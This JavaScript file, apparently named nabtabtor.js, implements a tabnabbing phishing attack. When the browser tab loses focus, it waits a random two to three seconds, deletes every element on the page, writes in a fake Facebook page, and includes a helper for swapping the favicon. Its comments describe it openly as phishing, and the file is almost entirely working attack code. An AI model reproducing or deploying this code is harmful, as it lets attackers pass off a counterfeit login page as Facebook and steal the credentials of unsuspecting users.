/*
* nabtabtor.js
* 
* George Skouroupathis
*
*/

var min_timeout = 2000,
	max_timeout = 3000;

// Binds the phishing attack to the blurring event
window.onblur = start_phishing_timeout;

// Counts down to zero from (between max_timeout & min_timeout)
// and calls the phishing process
function start_phishing_timeout() {
	var timeout = Math.round(Math.random() * (max_timeout - min_timeout)) + min_timeout;
	console.log(timeout);
	setTimeout(start_phishing, timeout);
}

// Starts the phishing process
function start_phishing() {
	clear_page_contents();
	build_page(facebook_fake_page);
}
	
// Deletes all the current page elements
function clear_page_contents() {
	var all = document.getElementsByTagName("*");

	for (var i=0, len=all.length; i < len; i++) {
		try {
			 all[i].parentNode.removeChild(all[i]);
		} catch(e) {
			// pass
		}
	}
}

// Displays the page from the webpage object
function build_page(webpage) {
	document.write(webpage.getSource);
	document.close();
}

// Dynamically changes the favicon of the webpage
function change_fav_icon(url) {
	document.head = document.head || document.getElementsByTagName('head')[0];
	var link = document.createElement('link');
	link.rel = 'shortcut icon';
	link.href = url;
	document.head.appendChild(link);
}